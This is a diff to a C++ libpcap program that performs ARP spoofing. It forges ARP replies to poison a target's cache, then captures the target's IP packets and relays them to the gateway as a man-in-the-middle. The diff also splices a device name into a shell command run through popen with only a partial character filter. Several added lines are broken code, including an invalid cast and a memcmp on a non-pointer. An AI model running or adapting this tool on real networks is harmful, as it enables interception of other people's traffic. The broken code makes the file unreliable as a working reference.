@@ -9,6 +9,7 @@
 #include <vector>
 #include <atomic>
 #include <pcap.h>
+#include <linux/ip.h>
 
 #define REQUEST 0x0001
 #define REPLY 0x0002
@@ -18,6 +19,7 @@ using namespace std;
 char* dev = NULL;
 uint8_t gateway[6];
 uint8_t my_mac[6];
+uint32_t my_ip;
 
 #pragma pack(push,1)
 struct eth_header {
@@ -95,22 +97,22 @@ void my_inet_aton(char* strIP, uint32_t* hexIP) {
 	(*hexIP) = res;
 }
 
-void strToHexMac(char* buf, uint8_t* mac) {
+void strToHexMac(char* in_mac, uint8_t* out_mac) {
 	for (int i=0, j=0; i < 18 && j < 6; i++,j++) {
 		uint8_t tmp1, tmp2;
-		if (buf[i] >= 'a' && buf[i] <= 'f') 
-			tmp1 = buf[i]-'a'+10;
-		else if (buf[i] >= '0' && buf[i] <= '9')
-			tmp1 = buf[i]-'0';
+		if (in_mac[i] >= 'a' && in_mac[i] <= 'f') 
+			tmp1 = in_mac[i]-'a'+10;
+		else if (in_mac[i] >= '0' && in_mac[i] <= '9')
+			tmp1 = in_mac[i]-'0';
 		else tmp1 = 0;
 		i++;
-		if (buf[i] >= 'a' && buf[i] <= 'f')
-			tmp2 = buf[i]-'a'+10;
-		else if (buf[i] >= '0' && buf[i] <= '9')
-			tmp2 = buf[i]-'0'+0;
+		if (in_mac[i] >= 'a' && in_mac[i] <= 'f')
+			tmp2 = in_mac[i]-'a'+10;
+		else if (in_mac[i] >= '0' && in_mac[i] <= '9')
+			tmp2 = in_mac[i]-'0'+0;
 		else tmp2 = 0;
 		i++;
-		mac[j] = (tmp1 << 4) | tmp2;
+		out_mac[j] = (tmp1 << 4) | tmp2;
 	}
 }
 
@@ -118,16 +120,12 @@ int getMyNetworkInfo(uint8_t* res, uint32_t* ip) {
 	if (strchr(dev, ';') != NULL || strchr(dev, '|') != NULL) return -1;
 	FILE *fp;
 	char buf[20];
-	char cmd[128] = "arp -n | grep ether | awk '{print $3}' && ifconfig ";
-	char *cmd1 = " | grep ether | awk '{print $2}'";
-	char *cmd2 = " && ifconfig ";
+	char cmd[128]; 
+	char *cmd1 = "arp -n | grep ether | awk '{print $3}' && ifconfig ";
+	char *cmd2 = " | grep ether | awk '{print $2}' && ifconfig";
 	char *cmd3 = " | grep netmask | awk '{print $2}';";
 
-	strcat(cmd, dev);
-	strcat(cmd, cmd1);
-	strcat(cmd, cmd2);
-	strcat(cmd, dev);
-	strcat(cmd, cmd3);
+	sprintf(cmd, "%s%s%s%s%s",cmd1, dev, cmd2, dev, cmd3);
 	fp = popen(cmd, "r");
 	if (NULL == fgets(buf, sizeof(buf), fp)) return -1;
 	strToHexMac(buf, gateway);
@@ -154,47 +152,49 @@ void* _func(u_char* packet, int packet_size) {
 	} 
 
 	while (1) {
-		if (pcap_sendpacket(handle, copied, packet_size) == -1) {
-			printf("ARP Spoofing Failed..\n");
-			break;
-		}
-		printf("ARP Spoofing Success!!!\n");
 		struct eth_header *recv_eth_hdr;
 		struct pcap_pkthdr* header;
 		const u_char* spoofed_packet;
-		while (1) {
-			int res = pcap_next_ex(handle, &header, &spoofed_packet);
-			if (res < 0) break;
-			if (res == 0) continue;
-			recv_eth_hdr = (struct eth_header*) spoofed_packet;
-			if (ntohs(recv_eth_hdr->type) != ETHERTYPE_ARP) {
-				if (!memcmp(recv_eth_hdr->dest_mac, my_mac, 6)) {
-					printf("Spoofed Packet=======================================\n");
-					printf("Src MAC: ");
-					for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->src_mac[i]);
-					printf("\nDest MAC: ");
-					for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->dest_mac[i]);
-					printf("\n=====================================================\n");
+		int res = pcap_next_ex(handle, &header, &spoofed_packet);
+		if (res < 0) break;
+		if (res == 0) continue;
+		recv_eth_hdr = (struct eth_header*) spoofed_packet;
+		if (ntohs(recv_eth_hdr->type) == ETHERTYPE_IP) {
+			struct iphdr* ip_hdr = (struct iphdr* ip_hdr) (spoofed_packet+14);
+			if (!memcmp(recv_eth_hdr->dest_mac, my_mac, 6) && !memcmp(ip_hdr->saddr, my_ip, 4)) {
+				printf("Spoofed Packet=======================================\n");
+				printf("Src MAC: ");
+				for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->src_mac[i]);
+				printf("\nDest MAC: ");
+				for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->dest_mac[i]);
+				printf("\n=====================================================\n");
 
-					memcpy(recv_eth_hdr->dest_mac, gateway, 6);
-					memcpy(recv_eth_hdr->src_mac, my_mac, 6);
-					printf("Relay Packet=======================================\n");
-					printf("Src MAC: ");
-					for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->src_mac[i]);
-					printf("\nDest MAC: ");
-					for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->dest_mac[i]);
-					printf("\n=====================================================\n");
-					
-					if (pcap_sendpacket(handle, spoofed_packet, packet_size) == -1) {
-						printf("Relay Failed..\n");
-					} else {
-						printf("Relay Success!!!!\n");
-						break;
-					}
+				memcpy(recv_eth_hdr->dest_mac, gateway, 6);
+				memcpy(recv_eth_hdr->src_mac, my_mac, 6);
+				printf("Relay Packet=======================================\n");
+				printf("Src MAC: ");
+				for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->src_mac[i]);
+				printf("\nDest MAC: ");
+				for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->dest_mac[i]);
+				printf("\n=====================================================\n");
+				
+				if (pcap_sendpacket(handle, spoofed_packet, packet_size) == -1) {
+					printf("Relay Failed..\n");
+					break;
+				} else {
+					printf("Relay Success!!!!\n");
+				}
+			}
+		} else if (ntohs(recv_eth_hdr->type) == ETHERTYPE_ARP) {
+			if (!memcmp(recv_eth_hdr->dest_mac, my_mac, 6)) {
+				if (pcap_sendpacket(handle, copied, packet_size) == -1) {
+					printf("ARP Spoofing Failed..\n");
+					break;
+				} else {
+					printf("ARP Spoofing Success!!!\n");
 				}
 			}
 		}
-		sleep(1);
 	}
 	free(copied);
 	pcap_close(handle);
@@ -211,7 +211,6 @@ int main(int argc, char* argv[]) {
 	if (eth_hdr == NULL || arp_hdr == NULL) return -3;
 	vector<thread> threads;
 
-	uint32_t my_ip;
 	uint32_t sender_ip;
 	dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -223,7 +222,6 @@ int main(int argc, char* argv[]) {
 	if (getMyNetworkInfo(my_mac, &my_ip) == -1) return -1;
 	for (int i=0; i<6; i++) 
 		eth_hdr->src_mac[i] = arp_hdr->sender_mac[i] = my_mac[i];
-	printf("MY IP: %x\n", my_ip);
 	
 	int eth_sz = sizeof(*eth_hdr);
 	int arp_sz = sizeof(*arp_hdr);
@@ -283,6 +281,11 @@ int main(int argc, char* argv[]) {
 					memcpy(packet+14, arp_hdr, arp_sz);
 					printf("=====================================================\n");
 
+					if (pcap_sendpacket(handle, copied, packet_size) == -1) {
+						printf("ARP Spoofing Failed..\n");
+					} else {
+						printf("ARP Spoofing Success!!!\n");
+					}
 					threads.push_back(thread(_func, packet, _sz));
 					break;
 				}
